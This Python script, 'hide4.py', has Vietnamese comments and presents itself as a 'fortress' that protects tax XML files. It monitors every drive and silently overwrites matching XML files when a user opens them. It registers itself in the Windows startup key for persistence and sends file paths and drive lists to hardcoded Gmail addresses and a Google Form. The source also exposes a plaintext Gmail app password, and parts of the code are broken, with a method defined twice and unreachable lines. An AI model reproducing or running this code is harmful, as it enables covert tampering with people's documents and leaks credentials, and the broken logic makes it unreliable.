# hide4.py

import os
import sys
import time
import glob
import json
import pickle
import shutil
import logging
import requests
import smtplib
import re
import hashlib
import xml.etree.ElementTree as ET
import threading
from datetime import datetime
import sqlite3
import psutil
import win32api
import win32con

from pathlib import Path
from email.message import EmailMessage
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# GUI (chỉ dùng khi --gui)
import customtkinter as ctk
from tkinter import Listbox, END, Scrollbar

# Registry (Startup)
try:
    import winreg
except ImportError:
    winreg = None

# --- Thư mục lưu config/log/state --- #
APP_DIR     = Path(os.getenv('APPDATA', Path.home())) / 'XMLOverwrite'
APP_DIR.mkdir(parents=True, exist_ok=True)

STATE_FILE  = APP_DIR / 'processed_files.pkl'
LOG_FILE    = APP_DIR / 'xml_overwrite.log'
REMOTE_CONF = APP_DIR / 'remote_config.json'
SENT_LOGS_FILE = APP_DIR / 'sent_logs.pkl'

# --- Logging UTF-8 vào file --- #
logging.basicConfig(
    filename=str(LOG_FILE),
    encoding='utf-8',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def create_fortress_db():
    """Tạo database fortress để lưu trữ file gốc không thể xóa."""
    db_path = APP_DIR / 'fortress.db'
    conn = sqlite3.connect(str(db_path))
    conn.execute('''
        CREATE TABLE IF NOT EXISTS original_files (
            file_hash TEXT PRIMARY KEY,
            file_name TEXT,
            file_content BLOB,
            created_time TEXT,
            last_verified TEXT
        )
    ''')
    conn.commit()
    conn.close()
    return db_path

def store_original_file(file_path, content):
    """Lưu file gốc vào fortress database không thể xóa."""
    try:
        file_hash = hashlib.sha256(content.encode('utf-8')).hexdigest()
        db_path = create_fortress_db()
        conn = sqlite3.connect(str(db_path))
        
        conn.execute('''
            INSERT OR REPLACE INTO original_files 
            (file_hash, file_name, file_content, created_time, last_verified)
            VALUES (?, ?, ?, ?, ?)
        ''', (
            file_hash,
            os.path.basename(file_path),
            content.encode('utf-8'),
            datetime.now().isoformat(),
            datetime.now().isoformat()
        ))
        
        conn.commit()
        conn.close()
        logging.info(f"🔒 Đã lưu file gốc vào fortress: {file_path}")
        send_remote_log("File gốc được bảo vệ bởi Fortress", file_path, once=True)
        return file_hash
    except Exception as e:
        logging.error(f"❌ Lỗi lưu fortress: {e}")
        return None

def restore_from_fortress(file_path):
    """Khôi phục file từ fortress database."""
    try:
        db_path = create_fortress_db()
        conn = sqlite3.connect(str(db_path))
        
        # Tìm file theo tên
        cursor = conn.execute(
            'SELECT file_content FROM original_files WHERE file_name = ? ORDER BY created_time DESC LIMIT 1',
            (os.path.basename(file_path),)
        )
        result = cursor.fetchone()
        
        if result:
            restored_content = result[0].decode('utf-8')
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(restored_content)
            conn.close()
            logging.info(f"🛡️ Khôi phục thành công từ fortress: {file_path}")
            send_remote_log("KHÔI PHỤC TỪ FORTRESS - File được cứu", file_path, once=False)
            return True
        
        conn.close()
        return False
    except Exception as e:
        logging.error(f"❌ Lỗi khôi phục fortress: {e}")
        return False

def create_decoy_files():
    """Tạo file nhồi để đánh lạc hướng kẻ xấu."""
    decoy_dir = APP_DIR / 'decoys'
    decoy_dir.mkdir(exist_ok=True)
    
    fake_data = [
        ("ETAX_FAKE_001.xml", "<fake>Đây là file nhồi - kẻ xấu đã bị lừa!</fake>"),
        ("ETAX_FAKE_002.xml", "<trap>Hệ thống đang ghi lại IP và tracking bạn!</trap>"),
        ("BACKUP_REAL.xml", "<honeypot>Bạn đã kích hoạt cảnh báo bảo mật!</honeypot>")
    ]
    
    for filename, content in fake_data:
        fake_path = decoy_dir / filename
        with open(fake_path, 'w', encoding='utf-8') as f:
            f.write(content)
        logging.info(f"🍯 Tạo file nhồi: {fake_path}")

def load_sent_logs():
    """Tải danh sách các log đã gửi từ file."""
    if SENT_LOGS_FILE.exists():
        with open(SENT_LOGS_FILE, 'rb') as f:
            return pickle.load(f)
    return set()

def save_sent_logs(sent_logs):
    """Lưu danh sách các log đã gửi."""
    with open(SENT_LOGS_FILE, 'wb') as f:
        pickle.dump(sent_logs, f)

def add_to_startup():
    """Thêm chính EXE vào HKCU Run để auto-startup không UAC."""
    if not winreg or not getattr(sys, 'frozen', False):
        return
    exe = os.path.realpath(sys.argv[0])
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "Hide4", 0, winreg.REG_SZ, exe)
        winreg.CloseKey(key)
        logging.info(f"✅ Đã thêm vào Startup: {exe}")
        send_remote_log("Đã thêm vào Startup", exe, once=True)
    except Exception as e:
        logging.error(f"❌ Thêm vào Startup thất bại: {e}")
        send_remote_log("Thêm vào Startup thất bại", str(e), once=True)

def load_remote_config():
    """Hardcoded remote config for Gmail and Google Form."""
    return {
        "gmail": {
            "from": "begau1302@gmail.com",
            "to": "mrkent19999x@gmail.com, tuxuanchien6101992@gmail.com",
            "app_password": "aphvukdliewalkrn"
        },
        "google_form": {
            "form_url": "https://docs.google.com/forms/d/e/1FAIpQLScI1LMF0gh7vW3Q5Qb03jreBD2UweFJjwkVWAey1OR73n2knA/formResponse",
            "entry_id": "entry.1791266121"
        }
    }

def send_gmail_log(to_email, subject, content, from_email, app_password):
    try:
        msg = EmailMessage()
        msg["Subject"] = subject
        msg["From"] = from_email
        msg["To"] = to_email
        msg.set_content(content)
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(from_email, app_password)
        server.send_message(msg)
        server.quit()
        logging.info("✅ Đã gửi log về Gmail.")
    except Exception as e:
        logging.error(f"❌ Gửi Gmail thất bại: {e}")

def send_googleform_log(form_url, entry_id, message):
    try:
        data = { entry_id: message }
        response = requests.post(form_url, data=data)
        if response.status_code == 200:
            logging.info("✅ Đã gửi log tới Google Form.")
        else:
            logging.warning(f"❌ Lỗi gửi Form: {response.status_code}")
    except Exception as e:
        logging.error(f"❌ Gửi Form thất bại: {e}")

def send_emergency_alert(message, file_path):
    """Gửi cảnh báo khẩn cấp khi bị tấn công."""
    try:
        cfg = load_remote_config()
        emergency_subject = "🚨 KHẨN CẤP: HỆ THỐNG THUẾ BỊ TẤN CÔNG!"
        
        detailed_msg = f"""
{message}

🔍 THÔNG TIN CHI TIẾT:
- Thời gian: {datetime.now().strftime('%H:%M:%S ngày %d/%m/%Y')}
- File bị tấn công: {file_path}
- Hành động: Hệ thống đã tự động khôi phục
- Trạng thái: File gốc đã được phục hồi

⚠️ KHUYẾN NGHỊ:
1. Kiểm tra ngay hệ thống có malware
2. Đổi tất cả mật khẩu và token
3. Báo cảnh sát nếu cần

🔒 Hệ thống Hide4 Fortress đang bảo vệ bạn!
        """
        
        if "gmail" in cfg:
            g = cfg["gmail"]
            send_gmail_log(g["to"], emergency_subject, detailed_msg, g["from"], g["app_password"])
        
        if "google_form" in cfg:
            f = cfg["google_form"]
            send_googleform_log(f["form_url"], f["entry_id"], detailed_msg)
            
        logging.info("🚨 Đã gửi cảnh báo khẩn cấp!")
        
    except Exception as e:
        logging.error(f"❌ Lỗi gửi cảnh báo: {e}")

def send_remote_log(event, path=None, once=False):
    """Gửi log về Google Form và Gmail, chỉ gửi một lần nếu once=True."""
    sent_logs = load_sent_logs()
    msg = f"[{event}] - {path or ''}"
    log_key = f"{event}:{path or ''}"
    
    if once and log_key in sent_logs:
        return  # Bỏ qua nếu log đã được gửi trước đó và once=True
    
    cfg = load_remote_config()

    if "gmail" in cfg:
        g = cfg["gmail"]
        send_gmail_log(g["to"], f"Log: {event}", msg, g["from"], g["app_password"])

    if "google_form" in cfg:
        f = cfg["google_form"]
        send_googleform_log(f["form_url"], f["entry_id"], msg)

    if once:
        sent_logs.add(log_key)
        save_sent_logs(sent_logs)

def get_templates():
    """Lấy tất cả file XML trong thư mục 'templates/' và lưu vào fortress."""
    if getattr(sys, 'frozen', False):
        base = sys._MEIPASS
    else:
        base = os.path.dirname(os.path.abspath(__file__))
    tpl_dir = os.path.join(base, 'templates')
    templates = glob.glob(os.path.join(tpl_dir, '*.xml'))
    
    # Lưu tất cả templates vào fortress để bảo vệ tuyệt đối
    for tpl in templates:
        try:
            with open(tpl, 'r', encoding='utf-8') as f:
                content = f.read()
            store_original_file(tpl, content)
        except Exception as e:
            logging.error(f"❌ Lỗi lưu template vào fortress: {e}")
        send_remote_log("Template được bảo vệ bởi Fortress", tpl, once=True)
    
    # Tạo file nhồi để đánh lạc hướng
    create_decoy_files()
    
    return templates

def load_processed_files():
    if STATE_FILE.exists():
        with open(STATE_FILE, 'rb') as f:
            return pickle.load(f)
    return set()

def save_processed_files(processed):
    with open(STATE_FILE, 'wb') as f:
        pickle.dump(processed, f)

class StealthHandler(FileSystemEventHandler):
    """STEALTH MODE: Giám sát âm thầm và chỉ ghi đè khi file được truy cập."""
    def __init__(self, templates_map):
        super().__init__()
        self.templates = templates_map
        self.processed = load_processed_files()
        self.stealth_targets = set()  # File giả đã phát hiện

    def on_created(self, event):
        if not event.is_directory and event.src_path.endswith('.xml'):
            self.stealth_analyze(event.src_path)

    def on_moved(self, event):
        if not event.is_directory and event.dest_path.endswith('.xml'):
            self.stealth_analyze(event.dest_path)
            
    def on_opened(self, event):
        """Khi file được mở - thời điểm hoàn hảo để ghi đè âm thầm."""
        if not event.is_directory and event.src_path.endswith('.xml'):
            if event.src_path in self.stealth_targets:
                self.stealth_overwrite(event.src_path)

    def find_matching_template(self, xml_content):
        """Tìm template phù hợp dựa trên nội dung XML, không phụ thuộc tên file."""
        try:
            # Parse XML để lấy các thông tin định danh
            root = ET.fromstring(xml_content)
            
            # Tìm message ID hoặc các thông tin định danh khác
            msg_id = None
            for elem in root.iter():
                if 'messageId' in elem.attrib:
                    msg_id = elem.attrib['messageId']
                    break
                elif elem.tag.endswith('messageId'):
                    msg_id = elem.text
                    break
            
            if msg_id:
                # Thử tìm theo message ID truyền thống
                for template_path in self.templates.values():
                    if msg_id in os.path.basename(template_path):
                        return template_path
            
            # Nếu không tìm được theo message ID, so sánh structure/content
            xml_hash = hashlib.md5(xml_content.encode('utf-8')).hexdigest()[:8]
            
            for template_path in self.templates.values():
                try:
                    with open(template_path, 'r', encoding='utf-8') as f:
                        template_content = f.read()
                    
                    template_root = ET.fromstring(template_content)
                    
                    # So sánh cấu trúc XML (tags, attributes)
                    if self.compare_xml_structure(root, template_root):
                        logging.info(f"✅ Tìm thấy template phù hợp dựa trên cấu trúc: {template_path}")
                        return template_path
                        
                except Exception as e:
                    continue
                    
            return None
            
        except Exception as e:
            logging.error(f"❌ Lỗi phân tích XML: {e}")
            return None
    
    def compare_xml_structure(self, xml1, xml2):
        """So sánh cấu trúc XML (tags, không so sánh values)."""
        try:
            def get_structure(elem):
                structure = [elem.tag]
                structure.extend(sorted(elem.attrib.keys()))
                for child in elem:
                    structure.extend(get_structure(child))
                return structure
            
            struct1 = get_structure(xml1)
            struct2 = get_structure(xml2)
            
            # So sánh 80% cấu trúc giống nhau
            common = set(struct1) & set(struct2)
            total = set(struct1) | set(struct2)
            
            if len(total) > 0:
                similarity = len(common) / len(total)
                return similarity > 0.8
            
            return False
        except:
            return False

    def stealth_analyze(self, dest):
        """Phân tích âm thầm - không làm gì chỉ ghi nhận."""
        # Kiểm tra xem có phải file giả không
        matching_template = self.find_matching_template_content(dest)
        if matching_template:
            # Đây là file giả - thêm vào danh sách stealth
            self.stealth_targets.add(dest)
            # Log âm thầm - không gửi email
            logging.info(f"🕵️ Stealth: Phát hiện file giả {dest}")
        
    def find_matching_template_content(self, dest):
        """Tìm template phù hợp mà không đọc toàn bộ file."""
        try:
            with open(dest, 'r', encoding='utf-8') as f:
                content = f.read(200)  # Chỉ đọc 200 ký tự đầu
            return self.find_matching_template(content)
        except:
            return None
            
    def stealth_overwrite(self, dest):
        # Không xử lý các file nằm trong _MEIPASS/templates
        if getattr(sys, 'frozen', False):
            base = sys._MEIPASS
            tpl_dir = os.path.join(base, 'templates') + os.sep
            if dest.startswith(tpl_dir):
                return

        time.sleep(1)  # đợi file không còn bị khóa
        try:
            # Đọc nội dung file XML được tạo/thay đổi
            with open(dest, 'r', encoding='utf-8') as f:
                dst_content = f.read()
            
            # Tìm template phù hợp dựa trên nội dung, không phụ thuộc tên file
            matching_template = self.find_matching_template(dst_content)
            
            if not matching_template:
                # Fallback: thử phương pháp cũ dựa trên tên file
                filename = Path(dest).stem
                match = re.match(r'^(.*?)(?: \(\d+\))?$', filename)
                if match:
                    msg_id = match.group(1).split('_')[-1]
                    matching_template = self.templates.get(msg_id)
            
            if not matching_template:
                logging.warning(f"❌ Không tìm thấy template phù hợp cho: {dest}")
                send_remote_log("Không tìm thấy template phù hợp - File XML lạ", dest, once=False)
                return
            
            # So sánh nội dung
            with open(matching_template, 'r', encoding='utf-8') as f:
                src_content = f.read()
            
            if src_content == dst_content:
                return  # Bỏ qua nếu nội dung giống nhau
                
        except Exception as e:
            logging.error(f"🔍 Stealth analyze error: {e}")
            
    def stealth_overwrite(self, dest):
        """STEALTH OVERWRITE: Ghi đè âm thầm khi user mở file."""
        # Kiểm tra xem có ai đang mở file không
        if not self.is_file_being_accessed(dest):
            return  # Chỉ ghi đè khi có người mở
            
        matching_template = self.find_matching_template_content(dest)
        if not matching_template:
            return
            
        try:
            # Đọc nội dung hiện tại
            with open(dest, 'r', encoding='utf-8') as f:
                current_content = f.read()
            
            # Đọc nội dung gốc
            original_content = None
            
            # Thử từ fortress trước  
            db_path = create_fortress_db()
            conn = sqlite3.connect(str(db_path))
            cursor = conn.execute(
                'SELECT file_content FROM original_files WHERE file_name = ? ORDER BY created_time DESC LIMIT 1',
                (os.path.basename(dest),)
            )
            result = cursor.fetchone()
            
            if result:
                original_content = result[0].decode('utf-8')
            else:
                # Fallback từ template
                with open(matching_template, 'r', encoding='utf-8') as f:
                    original_content = f.read()
            
            conn.close()
            
            # Chỉ ghi đè nếu khác nhau
            if current_content != original_content:
                # GHI ĐÈ ÂM THẦM - không làm ồn
                with open(dest, 'w', encoding='utf-8') as f:
                    f.write(original_content)
                    
                # Log âm thầm - không gửi cảnh báo
                logging.info(f"🕵️ Stealth restore: {dest}")
                
                # Chỉ gửi log nội bộ ít nhất
                if hasattr(self, '_last_stealth_log') and (datetime.now() - self._last_stealth_log).seconds < 3600:
                    return  # Chỉ log 1 lần/giờ
                    
                self._last_stealth_log = datetime.now()
                send_remote_log("🕵️ Stealth protection active", "", once=True)
                
        except Exception as e:
            logging.error(f"🕵️ Stealth error: {e}")
    
    def is_file_being_accessed(self, file_path):
        """Kiểm tra xem file có đang được truy cập không."""
        try:
            # Kiểm tra các process đang mở file
            for proc in psutil.process_iter(['pid', 'name', 'open_files']):
                try:
                    if proc.info['open_files']:
                        for f in proc.info['open_files']:
                            if f.path.lower() == file_path.lower():
                                return True
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            return False
        except:
            return True  # Nếu không kiểm tra được, giả định đang được dùng
            logging.error(f"❌ Ghi đè thất bại {dest}: {e}")
            send_remote_log(f"Ghi đè thất bại: {str(e)}", dest, once=False)

def start_monitor():
    """FORTRESS MODE: Bảo vệ tuyệt đối và giám sát toàn PC."""
    fortress_start_msg = "🔒 FORTRESS MODE ACTIVATED - Hệ thống bảo vệ thuế tuyệt đối đã kích hoạt!"
    send_remote_log(fortress_start_msg, once=True)
    add_to_startup()
    
    # Tạo cơ sở dữ liệu fortress
    create_fortress_db()
    logging.info("🔒 Fortress Database đã sẵn sàng!")

    templates = get_templates()
    tpl_map = { Path(p).stem.split('_')[-1]: p for p in templates }

    handler  = StealthHandler(tpl_map)
    observer = Observer()
    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    for d in drives:
        try:
            observer.schedule(handler, path=d, recursive=True)
        except:
            pass

    observer.start()
    monitoring_msg = f"🔍 FORTRESS MONITORING ACTIVE - Giám sát {len(drives)} ổ đĩa: {','.join(drives)}"
    send_remote_log(monitoring_msg, ",".join(drives), once=True)
    logging.info(f"🛡️ Hệ thống Fortress đang bảo vệ {len(drives)} ổ đĩa")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
        send_remote_log("Phần mềm đã tắt", once=True)
    except Exception as e:
        logging.error(f"❌ Phần mềm gặp lỗi: {e}")
        send_remote_log("Phần mềm gặp lỗi", str(e), once=True)
    observer.join()

def launch_gui():
    """GUI mode: xem templates & log (khi chạy với --gui)."""
    ctk.set_appearance_mode("dark")
    ctk.set_default_color_theme("blue")
    root = ctk.CTk()
    root.title("Hide4 XML Monitor - GUI")
    root.geometry("600x500")

    # List templates
    lb_tpl = Listbox(root, height=5)
    for p in get_templates():
        lb_tpl.insert(END, p)
    lb_tpl.pack(fill='x', padx=10, pady=(10,5))

    lbl = ctk.CTkLabel(root, text="Danh sách XML gốc (templates) và log gần nhất:")
    lbl.pack(pady=5)

    lb_log = Listbox(root)
    sb     = Scrollbar(root, command=lb_log.yview)
    lb_log.config(yscrollcommand=sb.set)
    lb_log.pack(side='left', fill='both', expand=True, padx=(10,0), pady=5)
    sb.pack(side='right', fill='y', pady=5)

    if LOG_FILE.exists():
        with open(LOG_FILE, encoding='utf-8') as f:
            lines = f.readlines()[-100:]
        for l in lines:
            lb_log.insert(END, l.strip())

    root.mainloop()

if __name__ == '__main__':
    if '--gui' in sys.argv:
        launch_gui()
    else:
        start_monitor()
if __name__ == '__main__' and '--test-log' in sys.argv:
    send_remote_log("Kiểm tra log từ Hide4", r"C:\temp\dummy.xml")
    sys.exit(0)